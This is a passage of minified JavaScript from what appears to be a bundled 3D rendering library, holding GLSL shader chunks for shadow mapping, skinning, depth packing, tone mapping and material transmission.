		vec2 st1 = dFdy( uv.st );
		vec3 N = surf_norm;
		vec3 q1perp = cross( q1, N );
		vec3 q0perp = cross( N, q0 );
		vec3 T = q1perp * st0.x + q0perp * st1.x;
		vec3 B = q1perp * st0.y + q0perp * st1.y;
		float det = max( dot( T, T ), dot( B, B ) );
		float scale = ( det == 0.0 ) ? 0.0 : inversesqrt( det );
		return mat3( T * scale, B * scale, N );
	}
#endif`,t1=`#ifdef USE_CLEARCOAT
	vec3 clearcoatNormal = nonPerturbedNormal;
#endif`,n1=`#ifdef USE_CLEARCOAT_NORMALMAP
	vec3 clearcoatMapN = texture2D( clearcoatNormalMap, vClearcoatNormalMapUv ).xyz * 2.0 - 1.0;
	clearcoatMapN.xy *= clearcoatNormalScale;
	clearcoatNormal = normalize( tbn2 * clearcoatMapN );
#endif`,i1=`#ifdef USE_CLEARCOATMAP
	uniform sampler2D clearcoatMap;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	uniform sampler2D clearcoatNormalMap;
	uniform vec2 clearcoatNormalScale;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	uniform sampler2D clearcoatRoughnessMap;
#endif`,s1=`#ifdef USE_IRIDESCENCEMAP
	uniform sampler2D iridescenceMap;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	uniform sampler2D iridescenceThicknessMap;
#endif`,r1=`#ifdef OPAQUE
diffuseColor.a = 1.0;
#endif
#ifdef USE_TRANSMISSION
diffuseColor.a *= material.transmissionAlpha;
#endif
gl_FragColor = vec4( outgoingLight, diffuseColor.a );`,a1=`vec3 packNormalToRGB( const in vec3 normal ) {
	return normalize( normal ) * 0.5 + 0.5;
}
vec3 unpackRGBToNormal( const in vec3 rgb ) {
	return 2.0 * rgb.xyz - 1.0;
}
const float PackUpscale = 256. / 255.;const float UnpackDownscale = 255. / 256.;const float ShiftRight8 = 1. / 256.;
const float Inv255 = 1. / 255.;
const vec4 PackFactors = vec4( 1.0, 256.0, 256.0 * 256.0, 256.0 * 256.0 * 256.0 );
const vec2 UnpackFactors2 = vec2( UnpackDownscale, 1.0 / PackFactors.g );
const vec3 UnpackFactors3 = vec3( UnpackDownscale / PackFactors.rg, 1.0 / PackFactors.b );
const vec4 UnpackFactors4 = vec4( UnpackDownscale / PackFactors.rgb, 1.0 / PackFactors.a );
vec4 packDepthToRGBA( const in float v ) {
	if( v <= 0.0 )
		return vec4( 0., 0., 0., 0. );
	if( v >= 1.0 )
		return vec4( 1., 1., 1., 1. );
	float vuf;
	float af = modf( v * PackFactors.a, vuf );
	float bf = modf( vuf * ShiftRight8, vuf );
	float gf = modf( vuf * ShiftRight8, vuf );
	return vec4( vuf * Inv255, gf * PackUpscale, bf * PackUpscale, af );
}
vec3 packDepthToRGB( const in float v ) {
	if( v <= 0.0 )
		return vec3( 0., 0., 0. );
	if( v >= 1.0 )
		return vec3( 1., 1., 1. );
	float vuf;
	float bf = modf( v * PackFactors.b, vuf );
	float gf = modf( vuf * ShiftRight8, vuf );
	return vec3( vuf * Inv255, gf * PackUpscale, bf );
}
vec2 packDepthToRG( const in float v ) {
	if( v <= 0.0 )
		return vec2( 0., 0. );
	if( v >= 1.0 )
		return vec2( 1., 1. );
	float vuf;
	float gf = modf( v * 256., vuf );
	return vec2( vuf * Inv255, gf );
}
float unpackRGBAToDepth( const in vec4 v ) {
	return dot( v, UnpackFactors4 );
}
float unpackRGBToDepth( const in vec3 v ) {
	return dot( v, UnpackFactors3 );
}
float unpackRGToDepth( const in vec2 v ) {
	return v.r * UnpackFactors2.r + v.g * UnpackFactors2.g;
}
vec4 pack2HalfToRGBA( const in vec2 v ) {
	vec4 r = vec4( v.x, fract( v.x * 255.0 ), v.y, fract( v.y * 255.0 ) );
	return vec4( r.x - r.y / 255.0, r.y, r.z - r.w / 255.0, r.w );
}
vec2 unpackRGBATo2Half( const in vec4 v ) {
	return vec2( v.x + ( v.y / 255.0 ), v.z + ( v.w / 255.0 ) );
}
float viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {
	return ( viewZ + near ) / ( near - far );
}
float orthographicDepthToViewZ( const in float depth, const in float near, const in float far ) {
	return depth * ( near - far ) - near;
}
float viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {
	return ( ( near + viewZ ) * far ) / ( ( far - near ) * viewZ );
}
float perspectiveDepthToViewZ( const in float depth, const in float near, const in float far ) {
	return ( near * far ) / ( ( far - near ) * depth - far );
}`,o1=`#ifdef PREMULTIPLIED_ALPHA
	gl_FragColor.rgb *= gl_FragColor.a;
#endif`,l1=`vec4 mvPosition = vec4( transformed, 1.0 );
#ifdef USE_BATCHING
	mvPosition = batchingMatrix * mvPosition;
#endif
#ifdef USE_INSTANCING
	mvPosition = instanceMatrix * mvPosition;
#endif
mvPosition = modelViewMatrix * mvPosition;
gl_Position = projectionMatrix * mvPosition;`,c1=`#ifdef DITHERING
	gl_FragColor.rgb = dithering( gl_FragColor.rgb );
#endif`,u1=`#ifdef DITHERING
	vec3 dithering( vec3 color ) {
		float grid_position = rand( gl_FragCoord.xy );
		vec3 dither_shift_RGB = vec3( 0.25 / 255.0, -0.25 / 255.0, 0.25 / 255.0 );
		dither_shift_RGB = mix( 2.0 * dither_shift_RGB, -2.0 * dither_shift_RGB, grid_position );
		return color + dither_shift_RGB;
	}
#endif`,d1=`float roughnessFactor = roughness;
#ifdef USE_ROUGHNESSMAP
	vec4 texelRoughness = texture2D( roughnessMap, vRoughnessMapUv );
	roughnessFactor *= texelRoughness.g;
#endif`,h1=`#ifdef USE_ROUGHNESSMAP
	uniform sampler2D roughnessMap;
#endif`,p1=`#if NUM_SPOT_LIGHT_COORDS > 0
	varying vec4 vSpotLightCoord[ NUM_SPOT_LIGHT_COORDS ];
#endif
#if NUM_SPOT_LIGHT_MAPS > 0
	uniform sampler2D spotLightMap[ NUM_SPOT_LIGHT_MAPS ];
#endif
#ifdef USE_SHADOWMAP
	#if NUM_DIR_LIGHT_SHADOWS > 0
		#if defined( SHADOWMAP_TYPE_PCF )
			uniform sampler2DShadow directionalShadowMap[ NUM_DIR_LIGHT_SHADOWS ];
		#else
			uniform sampler2D directionalShadowMap[ NUM_DIR_LIGHT_SHADOWS ];
		#endif
		varying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];
		struct DirectionalLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform DirectionalLightShadow directionalLightShadows[ NUM_DIR_LIGHT_SHADOWS ];
	#endif
	#if NUM_SPOT_LIGHT_SHADOWS > 0
		#if defined( SHADOWMAP_TYPE_PCF )
			uniform sampler2DShadow spotShadowMap[ NUM_SPOT_LIGHT_SHADOWS ];
		#else
			uniform sampler2D spotShadowMap[ NUM_SPOT_LIGHT_SHADOWS ];
		#endif
		struct SpotLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform SpotLightShadow spotLightShadows[ NUM_SPOT_LIGHT_SHADOWS ];
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
		#if defined( SHADOWMAP_TYPE_PCF )
			uniform samplerCubeShadow pointShadowMap[ NUM_POINT_LIGHT_SHADOWS ];
		#elif defined( SHADOWMAP_TYPE_BASIC )
			uniform samplerCube pointShadowMap[ NUM_POINT_LIGHT_SHADOWS ];
		#endif
		varying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];
		struct PointLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
			float shadowCameraNear;
			float shadowCameraFar;
		};
		uniform PointLightShadow pointLightShadows[ NUM_POINT_LIGHT_SHADOWS ];
	#endif
	#if defined( SHADOWMAP_TYPE_PCF )
		float interleavedGradientNoise( vec2 position ) {
			return fract( 52.9829189 * fract( dot( position, vec2( 0.06711056, 0.00583715 ) ) ) );
		}
		vec2 vogelDiskSample( int sampleIndex, int samplesCount, float phi ) {
			const float goldenAngle = 2.399963229728653;
			float r = sqrt( ( float( sampleIndex ) + 0.5 ) / float( samplesCount ) );
			float theta = float( sampleIndex ) * goldenAngle + phi;
			return vec2( cos( theta ), sin( theta ) ) * r;
		}
	#endif
	#if defined( SHADOWMAP_TYPE_PCF )
		float getShadow( sampler2DShadow shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord ) {
			float shadow = 1.0;
			shadowCoord.xyz /= shadowCoord.w;
			shadowCoord.z += shadowBias;
			bool inFrustum = shadowCoord.x >= 0.0 && shadowCoord.x <= 1.0 && shadowCoord.y >= 0.0 && shadowCoord.y <= 1.0;
			bool frustumTest = inFrustum && shadowCoord.z <= 1.0;
			if ( frustumTest ) {
				vec2 texelSize = vec2( 1.0 ) / shadowMapSize;
				float radius = shadowRadius * texelSize.x;
				float phi = interleavedGradientNoise( gl_FragCoord.xy ) * 6.28318530718;
				shadow = (
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 0, 5, phi ) * radius, shadowCoord.z ) ) +
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 1, 5, phi ) * radius, shadowCoord.z ) ) +
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 2, 5, phi ) * radius, shadowCoord.z ) ) +
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 3, 5, phi ) * radius, shadowCoord.z ) ) +
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 4, 5, phi ) * radius, shadowCoord.z ) )
				) * 0.2;
			}
			return mix( 1.0, shadow, shadowIntensity );
		}
	#elif defined( SHADOWMAP_TYPE_VSM )
		float getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord ) {
			float shadow = 1.0;
			shadowCoord.xyz /= shadowCoord.w;
			shadowCoord.z += shadowBias;
			bool inFrustum = shadowCoord.x >= 0.0 && shadowCoord.x <= 1.0 && shadowCoord.y >= 0.0 && shadowCoord.y <= 1.0;
			bool frustumTest = inFrustum && shadowCoord.z <= 1.0;
			if ( frustumTest ) {
				vec2 distribution = texture2D( shadowMap, shadowCoord.xy ).rg;
				float mean = distribution.x;
				float variance = distribution.y * distribution.y;
				#ifdef USE_REVERSED_DEPTH_BUFFER
					float hard_shadow = step( mean, shadowCoord.z );
				#else
					float hard_shadow = step( shadowCoord.z, mean );
				#endif
				if ( hard_shadow == 1.0 ) {
					shadow = 1.0;
				} else {
					variance = max( variance, 0.0000001 );
					float d = shadowCoord.z - mean;
					float p_max = variance / ( variance + d * d );
					p_max = clamp( ( p_max - 0.3 ) / 0.65, 0.0, 1.0 );
					shadow = max( hard_shadow, p_max );
				}
			}
			return mix( 1.0, shadow, shadowIntensity );
		}
	#else
		float getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord ) {
			float shadow = 1.0;
			shadowCoord.xyz /= shadowCoord.w;
			shadowCoord.z += shadowBias;
			bool inFrustum = shadowCoord.x >= 0.0 && shadowCoord.x <= 1.0 && shadowCoord.y >= 0.0 && shadowCoord.y <= 1.0;
			bool frustumTest = inFrustum && shadowCoord.z <= 1.0;
			if ( frustumTest ) {
				float depth = texture2D( shadowMap, shadowCoord.xy ).r;
				#ifdef USE_REVERSED_DEPTH_BUFFER
					shadow = step( depth, shadowCoord.z );
				#else
					shadow = step( shadowCoord.z, depth );
				#endif
			}
			return mix( 1.0, shadow, shadowIntensity );
		}
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
	#if defined( SHADOWMAP_TYPE_PCF )
	float getPointShadow( samplerCubeShadow shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord, float shadowCameraNear, float shadowCameraFar ) {
		float shadow = 1.0;
		vec3 lightToPosition = shadowCoord.xyz;
		vec3 bd3D = normalize( lightToPosition );
		vec3 absVec = abs( lightToPosition );
		float viewSpaceZ = max( max( absVec.x, absVec.y ), absVec.z );
		if ( viewSpaceZ - shadowCameraFar <= 0.0 && viewSpaceZ - shadowCameraNear >= 0.0 ) {
			float dp = ( shadowCameraFar * ( viewSpaceZ - shadowCameraNear ) ) / ( viewSpaceZ * ( shadowCameraFar - shadowCameraNear ) );
			dp += shadowBias;
			float texelSize = shadowRadius / shadowMapSize.x;
			vec3 absDir = abs( bd3D );
			vec3 tangent = absDir.x > absDir.z ? vec3( 0.0, 1.0, 0.0 ) : vec3( 1.0, 0.0, 0.0 );
			tangent = normalize( cross( bd3D, tangent ) );
			vec3 bitangent = cross( bd3D, tangent );
			float phi = interleavedGradientNoise( gl_FragCoord.xy ) * 6.28318530718;
			shadow = (
				texture( shadowMap, vec4( bd3D + ( tangent * vogelDiskSample( 0, 5, phi ).x + bitangent * vogelDiskSample( 0, 5, phi ).y ) * texelSize, dp ) ) +
				texture( shadowMap, vec4( bd3D + ( tangent * vogelDiskSample( 1, 5, phi ).x + bitangent * vogelDiskSample( 1, 5, phi ).y ) * texelSize, dp ) ) +
				texture( shadowMap, vec4( bd3D + ( tangent * vogelDiskSample( 2, 5, phi ).x + bitangent * vogelDiskSample( 2, 5, phi ).y ) * texelSize, dp ) ) +
				texture( shadowMap, vec4( bd3D + ( tangent * vogelDiskSample( 3, 5, phi ).x + bitangent * vogelDiskSample( 3, 5, phi ).y ) * texelSize, dp ) ) +
				texture( shadowMap, vec4( bd3D + ( tangent * vogelDiskSample( 4, 5, phi ).x + bitangent * vogelDiskSample( 4, 5, phi ).y ) * texelSize, dp ) )
			) * 0.2;
		}
		return mix( 1.0, shadow, shadowIntensity );
	}
	#elif defined( SHADOWMAP_TYPE_BASIC )
	float getPointShadow( samplerCube shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord, float shadowCameraNear, float shadowCameraFar ) {
		float shadow = 1.0;
		vec3 lightToPosition = shadowCoord.xyz;
		vec3 bd3D = normalize( lightToPosition );
		vec3 absVec = abs( lightToPosition );
		float viewSpaceZ = max( max( absVec.x, absVec.y ), absVec.z );
		if ( viewSpaceZ - shadowCameraFar <= 0.0 && viewSpaceZ - shadowCameraNear >= 0.0 ) {
			float dp = ( shadowCameraFar * ( viewSpaceZ - shadowCameraNear ) ) / ( viewSpaceZ * ( shadowCameraFar - shadowCameraNear ) );
			dp += shadowBias;
			float depth = textureCube( shadowMap, bd3D ).r;
			#ifdef USE_REVERSED_DEPTH_BUFFER
				shadow = step( depth, dp );
			#else
				shadow = step( dp, depth );
			#endif
		}
		return mix( 1.0, shadow, shadowIntensity );
	}
	#endif
	#endif
#endif`,f1=`#if NUM_SPOT_LIGHT_COORDS > 0
	uniform mat4 spotLightMatrix[ NUM_SPOT_LIGHT_COORDS ];
	varying vec4 vSpotLightCoord[ NUM_SPOT_LIGHT_COORDS ];
#endif
#ifdef USE_SHADOWMAP
	#if NUM_DIR_LIGHT_SHADOWS > 0
		uniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHT_SHADOWS ];
		varying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];
		struct DirectionalLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform DirectionalLightShadow directionalLightShadows[ NUM_DIR_LIGHT_SHADOWS ];
	#endif
	#if NUM_SPOT_LIGHT_SHADOWS > 0
		struct SpotLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform SpotLightShadow spotLightShadows[ NUM_SPOT_LIGHT_SHADOWS ];
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
		uniform mat4 pointShadowMatrix[ NUM_POINT_LIGHT_SHADOWS ];
		varying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];
		struct PointLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
			float shadowCameraNear;
			float shadowCameraFar;
		};
		uniform PointLightShadow pointLightShadows[ NUM_POINT_LIGHT_SHADOWS ];
	#endif
#endif`,m1=`#if ( defined( USE_SHADOWMAP ) && ( NUM_DIR_LIGHT_SHADOWS > 0 || NUM_POINT_LIGHT_SHADOWS > 0 ) ) || ( NUM_SPOT_LIGHT_COORDS > 0 )
	vec3 shadowWorldNormal = inverseTransformDirection( transformedNormal, viewMatrix );
	vec4 shadowWorldPosition;
#endif
#if defined( USE_SHADOWMAP )
	#if NUM_DIR_LIGHT_SHADOWS > 0
		#pragma unroll_loop_start
		for ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {
			shadowWorldPosition = worldPosition + vec4( shadowWorldNormal * directionalLightShadows[ i ].shadowNormalBias, 0 );
			vDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * shadowWorldPosition;
		}
		#pragma unroll_loop_end
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
		#pragma unroll_loop_start
		for ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {
			shadowWorldPosition = worldPosition + vec4( shadowWorldNormal * pointLightShadows[ i ].shadowNormalBias, 0 );
			vPointShadowCoord[ i ] = pointShadowMatrix[ i ] * shadowWorldPosition;
		}
		#pragma unroll_loop_end
	#endif
#endif
#if NUM_SPOT_LIGHT_COORDS > 0
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SPOT_LIGHT_COORDS; i ++ ) {
		shadowWorldPosition = worldPosition;
		#if ( defined( USE_SHADOWMAP ) && UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )
			shadowWorldPosition.xyz += shadowWorldNormal * spotLightShadows[ i ].shadowNormalBias;
		#endif
		vSpotLightCoord[ i ] = spotLightMatrix[ i ] * shadowWorldPosition;
	}
	#pragma unroll_loop_end
#endif`,g1=`float getShadowMask() {
	float shadow = 1.0;
	#ifdef USE_SHADOWMAP
	#if NUM_DIR_LIGHT_SHADOWS > 0
	DirectionalLightShadow directionalLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {
		directionalLight = directionalLightShadows[ i ];
		shadow *= receiveShadow ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowIntensity, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#if NUM_SPOT_LIGHT_SHADOWS > 0
	SpotLightShadow spotLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SPOT_LIGHT_SHADOWS; i ++ ) {
		spotLight = spotLightShadows[ i ];
		shadow *= receiveShadow ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowIntensity, spotLight.shadowBias, spotLight.shadowRadius, vSpotLightCoord[ i ] ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0 && ( defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_BASIC ) )
	PointLightShadow pointLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {
		pointLight = pointLightShadows[ i ];
		shadow *= receiveShadow ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowIntensity, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ], pointLight.shadowCameraNear, pointLight.shadowCameraFar ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#endif
	return shadow;
}`,v1=`#ifdef USE_SKINNING
	mat4 boneMatX = getBoneMatrix( skinIndex.x );
	mat4 boneMatY = getBoneMatrix( skinIndex.y );
	mat4 boneMatZ = getBoneMatrix( skinIndex.z );
	mat4 boneMatW = getBoneMatrix( skinIndex.w );
#endif`,y1=`#ifdef USE_SKINNING
	uniform mat4 bindMatrix;
	uniform mat4 bindMatrixInverse;
	uniform highp sampler2D boneTexture;
	mat4 getBoneMatrix( const in float i ) {
		int size = textureSize( boneTexture, 0 ).x;
		int j = int( i ) * 4;
		int x = j % size;
		int y = j / size;
		vec4 v1 = texelFetch( boneTexture, ivec2( x, y ), 0 );
		vec4 v2 = texelFetch( boneTexture, ivec2( x + 1, y ), 0 );
		vec4 v3 = texelFetch( boneTexture, ivec2( x + 2, y ), 0 );
		vec4 v4 = texelFetch( boneTexture, ivec2( x + 3, y ), 0 );
		return mat4( v1, v2, v3, v4 );
	}
#endif`,x1=`#ifdef USE_SKINNING
	vec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );
	vec4 skinned = vec4( 0.0 );
	skinned += boneMatX * skinVertex * skinWeight.x;
	skinned += boneMatY * skinVertex * skinWeight.y;
	skinned += boneMatZ * skinVertex * skinWeight.z;
	skinned += boneMatW * skinVertex * skinWeight.w;
	transformed = ( bindMatrixInverse * skinned ).xyz;
#endif`,_1=`#ifdef USE_SKINNING
	mat4 skinMatrix = mat4( 0.0 );
	skinMatrix += skinWeight.x * boneMatX;
	skinMatrix += skinWeight.y * boneMatY;
	skinMatrix += skinWeight.z * boneMatZ;
	skinMatrix += skinWeight.w * boneMatW;
	skinMatrix = bindMatrixInverse * skinMatrix * bindMatrix;
	objectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;
	#ifdef USE_TANGENT
		objectTangent = vec4( skinMatrix * vec4( objectTangent, 0.0 ) ).xyz;
	#endif
#endif`,b1=`float specularStrength;
#ifdef USE_SPECULARMAP
	vec4 texelSpecular = texture2D( specularMap, vSpecularMapUv );
	specularStrength = texelSpecular.r;
#else
	specularStrength = 1.0;
#endif`,S1=`#ifdef USE_SPECULARMAP
	uniform sampler2D specularMap;
#endif`,w1=`#if defined( TONE_MAPPING )
	gl_FragColor.rgb = toneMapping( gl_FragColor.rgb );
#endif`,M1=`#ifndef saturate
#define saturate( a ) clamp( a, 0.0, 1.0 )
#endif
uniform float toneMappingExposure;
vec3 LinearToneMapping( vec3 color ) {
	return saturate( toneMappingExposure * color );
}
vec3 ReinhardToneMapping( vec3 color ) {
	color *= toneMappingExposure;
	return saturate( color / ( vec3( 1.0 ) + color ) );
}
vec3 CineonToneMapping( vec3 color ) {
	color *= toneMappingExposure;
	color = max( vec3( 0.0 ), color - 0.004 );
	return pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );
}
vec3 RRTAndODTFit( vec3 v ) {
	vec3 a = v * ( v + 0.0245786 ) - 0.000090537;
	vec3 b = v * ( 0.983729 * v + 0.4329510 ) + 0.238081;
	return a / b;
}
vec3 ACESFilmicToneMapping( vec3 color ) {
	const mat3 ACESInputMat = mat3(
		vec3( 0.59719, 0.07600, 0.02840 ),		vec3( 0.35458, 0.90834, 0.13383 ),
		vec3( 0.04823, 0.01566, 0.83777 )
	);
	const mat3 ACESOutputMat = mat3(
		vec3(  1.60475, -0.10208, -0.00327 ),		vec3( -0.53108,  1.10813, -0.07276 ),
		vec3( -0.07367, -0.00605,  1.07602 )
	);
	color *= toneMappingExposure / 0.6;
	color = ACESInputMat * color;
	color = RRTAndODTFit( color );
	color = ACESOutputMat * color;
	return saturate( color );
}
const mat3 LINEAR_REC2020_TO_LINEAR_SRGB = mat3(
	vec3( 1.6605, - 0.1246, - 0.0182 ),
	vec3( - 0.5876, 1.1329, - 0.1006 ),
	vec3( - 0.0728, - 0.0083, 1.1187 )
);
const mat3 LINEAR_SRGB_TO_LINEAR_REC2020 = mat3(
	vec3( 0.6274, 0.0691, 0.0164 ),
	vec3( 0.3293, 0.9195, 0.0880 ),
	vec3( 0.0433, 0.0113, 0.8956 )
);
vec3 agxDefaultContrastApprox( vec3 x ) {
	vec3 x2 = x * x;
	vec3 x4 = x2 * x2;
	return + 15.5 * x4 * x2
		- 40.14 * x4 * x
		+ 31.96 * x4
		- 6.868 * x2 * x
		+ 0.4298 * x2
		+ 0.1191 * x
		- 0.00232;
}
vec3 AgXToneMapping( vec3 color ) {
	const mat3 AgXInsetMatrix = mat3(
		vec3( 0.856627153315983, 0.137318972929847, 0.11189821299995 ),
		vec3( 0.0951212405381588, 0.761241990602591, 0.0767994186031903 ),
		vec3( 0.0482516061458583, 0.101439036467562, 0.811302368396859 )
	);
	const mat3 AgXOutsetMatrix = mat3(
		vec3( 1.1271005818144368, - 0.1413297634984383, - 0.14132976349843826 ),
		vec3( - 0.11060664309660323, 1.157823702216272, - 0.11060664309660294 ),
		vec3( - 0.016493938717834573, - 0.016493938717834257, 1.2519364065950405 )
	);
	const float AgxMinEv = - 12.47393;	const float AgxMaxEv = 4.026069;
	color *= toneMappingExposure;
	color = LINEAR_SRGB_TO_LINEAR_REC2020 * color;
	color = AgXInsetMatrix * color;
	color = max( color, 1e-10 );	color = log2( color );
	color = ( color - AgxMinEv ) / ( AgxMaxEv - AgxMinEv );
	color = clamp( color, 0.0, 1.0 );
	color = agxDefaultContrastApprox( color );
	color = AgXOutsetMatrix * color;
	color = pow( max( vec3( 0.0 ), color ), vec3( 2.2 ) );
	color = LINEAR_REC2020_TO_LINEAR_SRGB * color;
	color = clamp( color, 0.0, 1.0 );
	return color;
}
vec3 NeutralToneMapping( vec3 color ) {
	const float StartCompression = 0.8 - 0.04;
	const float Desaturation = 0.15;
	color *= toneMappingExposure;
	float x = min( color.r, min( color.g, color.b ) );
	float offset = x < 0.08 ? x - 6.25 * x * x : 0.04;
	color -= offset;
	float peak = max( color.r, max( color.g, color.b ) );
	if ( peak < StartCompression ) return color;
	float d = 1. - StartCompression;
	float newPeak = 1. - d * d / ( peak + d - StartCompression );
	color *= newPeak / peak;
	float g = 1. - 1. / ( Desaturation * ( peak - newPeak ) + 1. );
	return mix( color, vec3( newPeak ), g );
}
vec3 CustomToneMapping( vec3 color ) { return color; }`,E1=`#ifdef USE_TRANSMISSION
	material.transmission = transmission;
	material.transmissionAlpha = 1.0;
	material.thickness = thickness;
	material.attenuationDistance = attenuationDistance;
	material.attenuationColor = attenuationColor;
	#ifdef USE_TRANSMISSIONMAP
		material.transmission *= texture2D( transmissionMap, vTransmissionMapUv ).r;
	#endif
	#ifdef USE_THICKNESSMAP
		material.thickness *= texture2D( thicknessMap, vThicknessMapUv ).g;
	#endif
	vec3 pos = vWorldPosition;
	vec3 v = normalize( cameraPosition - pos );
	vec3 n = inverseTransformDirection( normal, viewMatrix );
	vec4 transmitted = getIBLVolumeRefraction(
		n, v, material.roughness, material.diffuseContribution, material.specularColorBlended, material.specularF90,
		pos, modelMatrix, viewMatrix, projectionMatrix, material.dispersion, material.ior, material.thickness,
		material.attenuationColor, material.attenuationDistance );
	material.transmissionAlpha = mix( material.transmissionAlpha, transmitted.a, material.transmission );
	totalDiffuse = mix( totalDiffuse, transmitted.rgb, material.transmission );
#endif`,T1=`#ifdef USE_TRANSMISSION
	uniform float transmission;
	uniform float thickness;
	uniform float attenuationDistance;
	uniform vec3 attenuationColor;
	#ifdef USE_TRANSMISSIONMAP
		uniform sampler2D transmissionMap;
	#endif
	#ifdef USE_THICKNESSMAP
		uniform sampler2D thicknessMap;
	#endif
	uniform vec2 transmissionSamplerSize;
	uniform sampler2D transmissionSamplerMap;
	uniform mat4 modelMatrix;
	uniform mat4 projectionMatrix;
	varying vec3 vWorldPosition;
	float w0( float a ) {
		return ( 1.0 / 6.0 ) * ( a * ( a * ( - a + 3.0 ) - 3.0 ) + 1.0 );
	}
	float w1( float a ) {
		return ( 1.0 / 6.0 ) * ( a *  a * ( 3.0 * a - 6.0 ) + 4.0 );
	}
	float w2( float a ){
		return ( 1.0 / 6.0 ) * ( a * ( a * ( - 3.0 * a + 3.0 ) + 3.0 ) + 1.0 );
	}
	float w3( float a ) {
		return ( 1.0 / 6.0 ) * ( a * a * a );
	}
	float g0( float a ) {
		return w0( a ) + w1( a );
	}
	float g1( float a ) {
		return w2( a ) + w3( a );
	}
	float h0( float a ) {
		return - 1.0 + w1( a ) / ( w0( a ) + w1( a ) );
	}
	float h1( float a ) {
		return 1.0 + w3( a ) / ( w2( a ) + w3( a ) );
	}
	vec4 bicubic( sampler2D tex, vec2 uv, vec4 texelSize, float lod ) {
		uv = uv * texelSize.zw + 0.5;
		vec2 iuv = floor( uv );
		vec2 fuv = fract( uv );
		float g0x = g0( fuv.x );
		float g1x = g1( fuv.x );
		float h0x = h0( fuv.x );
		float h1x = h1( fuv.x );
		float h0y = h0( fuv.y );
		float h1y = h1( fuv.y );
		vec2 p0 = ( vec2( iuv.x + h0x, iuv.y + h0y ) - 0.5 ) * texelSize.xy;
		vec2 p1 = ( vec2( iuv.x + h1x, iuv.y + h0y ) - 0.5 ) * texelSize.xy;
		vec2 p2 = ( vec2( iuv.x + h0x, iuv.y + h1y ) - 0.5 ) * texelSize.xy;
		vec2 p3 = ( vec2( iuv.x + h1x, iuv.y + h1y ) - 0.5 ) * texelSize.xy;
		return g0( fuv.y ) * ( g0x * textureLod( tex, p0, lod ) + g1x * textureLod( tex, p1, lod ) ) +
			g1( fuv.y ) * ( g0x * textureLod( tex, p2, lod ) + g1x * textureLod( tex, p3, lod ) );
	}
	vec4 textureBicubic( sampler2D sampler, vec2 uv, float lod ) {
		vec2 fLodSize = vec2( textureSize( sampler, int( lod ) ) );
		vec2 cLodSize = vec2( textureSize( sampler, int( lod + 1.0 ) ) );
		vec2 fLodSizeInv = 1.0 / fLodSize;
		vec2 cLodSizeInv = 1.0 / cLodSize;
